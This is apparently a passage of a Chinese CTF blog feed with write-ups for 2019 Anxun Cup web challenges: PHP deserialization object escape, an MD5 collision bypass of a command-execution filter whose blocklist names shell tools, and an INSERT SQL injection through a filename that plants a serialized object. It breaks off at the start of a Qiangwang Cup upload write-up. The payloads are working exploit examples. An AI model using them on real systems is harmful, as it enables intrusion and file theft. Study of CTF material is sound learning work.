    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> </code></pre>
<p>提示在phpinfo中找东西</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">?</span>f<span class="token operator">=</span>phpinfo</code></pre>
<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712021749634.png" alt="image-20210712021749634"></p>
<p>那么现在就是要尝试读取这个文件</p>
<p>题目是先序列化$_SESSION，然后再经过一个过滤函数，然后再反序列化，这样就产生了一个问题，过滤函数会替换掉一些关键词，这样就会造成反序列化的对象逃逸问题~~</p>
<ul>
<li>第一种为关键词数增加<br>例如： where-&gt;hacker，这样词数由五个增加到6个</li>
<li>第二种为关键词数减少<br>例如：直接过滤掉一些关键词，例如这道题目中</li>
<li>第一种情况比较好构造，直接构造多个关键词，这样就能逃出几个字符~~</li>
<li>第二种可以是通过键逃逸和值逃逸~~</li>
</ul>
<p>$userinfo又是通过$serialize_info反序列化来的。</p>
<p>$serialize_info又是通过session序列化之后再过滤得来的。</p>
<h3 id="Payload1-值逃逸"><a href="#Payload1-值逃逸" class="headerlink" title="Payload1:值逃逸"></a>Payload1:值逃逸</h3><p>这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对~~</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>show_image</code></pre>
<p>ZDBnM19mMWFnLnBocA==为d0g3_f1ag.php的base64编码</p>
<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712023548011.png" alt="image-20210712023548011"></p>
<p>读取/d0g3_fllllllag：</p>
<pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";}&amp;function=show_image</code></pre>
<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210712023457458.png" alt="image-20210712023457458"></p>
<p>var_dump的结果为：</p>
<pre class=" language-php"><code class="language-php"><span class="token string">"a:3:{s:4:"</span>user<span class="token string">";s:24:"</span><span class="token string">";s:8:"</span><span class="token keyword">function</span><span class="token string">";s:59:"</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a<span class="token string">";}"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"</code></pre>
<h3 id="Payload2-键逃逸"><a href="#Payload2-键逃逸" class="headerlink" title="Payload2:键逃逸"></a>Payload2:键逃逸</h3><h3 id="这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对"><a href="#这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对" class="headerlink" title="这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~"></a>这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对~~</h3><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>flagphp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>var_dump的结果为：</p>
<pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>show_image</code></pre>
<p><img src="/2021/07/09/an-xun-bei-2019-easyserializephp/image-20210718221328853.png" alt="image-20210718221328853"></p>
<p>这儿得s:7:””之所以为空，是因为我们构造得键flagphp都是会被过滤得，所以显示为空，这样就能吃掉一部分值了，然后将剩下得值充当另一个对象逃逸出去~~</p>
]]></content>
  </entry>
  <entry>
    <title>安洵杯:2019-EasyWeb</title>
    <url>/2021/06/23/an-xun-bei-2019-easyweb/</url>
    <content><![CDATA[<pre><code>http://fb65bb1a-49d3-4476-acca-dcf2d1c5eff9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></pre>
<p><code>TXpVek5UTTFNbVUzTURabE5qYz</code>base64解码两次</p>
<p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210622104523837.png" alt="image-20210622104523837"></p>
<p>3535352e706e663</p>
<p>十六进制转换555.png</p>
<p><a href="www.metools.info/learn/l120.html">转码网站</a></p>
<p>加密反推index.php</p>
<pre class=" language-bash"><code class="language-bash">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre>
<p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210622105314503.png" alt="image-20210622105314503"></p>
<pre class=" language-php+HTML"><code class="language-php+HTML"><?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></code></pre>
<p><strong>md5强类型的绕过</strong></p>
<p>POST：</p>
<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
<p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210625154057205.png" alt="image-20210625154057205"></p>
<p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210625154228954.png" alt="image-20210625154228954"></p>
<p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210625154301450.png" alt="image-20210625154301450"></p>
]]></content>
  </entry>
  <entry>
    <title>安洵杯：2019-不是文件上传</title>
    <url>/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/</url>
    <content><![CDATA[<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920191233325.png" alt="image-20210920191233325"></p>
<p>github找到项目并下载下来</p>
<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920191305777.png" alt="image-20210920191305777"></p>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="helper-php"><a href="#helper-php" class="headerlink" title="helper.php"></a>helper.php</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"width"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"height"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Your images is uploaded successfully. And your image's id is $id.&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>序列化图片宽高</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<pre class=" language-php"><code class="language-php">
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token string">'filename'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string">'ext'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p><code>$filename = $info["name"];</code>是上传的图片，in_array规定图片，</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"`"</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token string">"`"</span><span class="token punctuation">;</span>
            <span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"'"</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO images ("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">") VALUES("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">")"</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ifview</span> <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> False<span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//The function is not yet perfect, it is not open yet.</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>调用view_files中的file_get_contents来读取flag</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token shell-comment comment"># Read some config html</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>__destruct魔术方法</p>
<h5 id="show-php"><a href="#show-php" class="headerlink" title="show.php"></a>show.php</h5><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920192444172.png" alt="image-20210920192444172"></p>
<p>反序列化</p>
<h5 id="总的来说就是"><a href="#总的来说就是" class="headerlink" title="总的来说就是"></a>总的来说就是</h5><p>1.图片传上之后，check函数并未对文件名(title)进行检测, 直接传递到最后的SQL语句当中。导致<br>了SQL注入，并且属于Insert注入。<br>2.图片数据在保存的时候，会将图片的高度和宽度进行序列化然后保存。<br>3.在查看图片信息的页面(show.php)会对其进行反序列化。</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">helper</span> <span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> True<span class="token punctuation">;</span> 
    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string">"/flag"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>执行</p>
<pre><code>O:6:"helper":2:{s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";}</code></pre>
<p>改为</p>
<pre><code>O:6:"helper":2:{s:9:"\0\0\0ifview";b:1;s:9:"\0\0\0config";s:5:"/flag";}</code></pre>
<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194842880.png" alt="image-20210920194842880"></p>
<pre><code>1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),('1.jpg</code></pre>
<p>上传的时候更改文件名</p>
<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194226160.png" alt="image-20210920194226160"></p>
<p>然后访问show.php</p>
<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920194251078.png" alt="image-20210920194251078"></p>
]]></content>
  </entry>
  <entry>
    <title>强网杯：2019-Upload</title>
    <url>/2021/09/02/qiang-wang-bei-2019-upload/</url>
    <content><![CDATA[<p>注册登录</p>
<p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912162832458.png" alt="image-20210912162832458"></p>
<p>随便上传一个图片马：</p>
<p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912163550886.png" alt="image-20210912163550886"></p>
<p>base64解码</p>
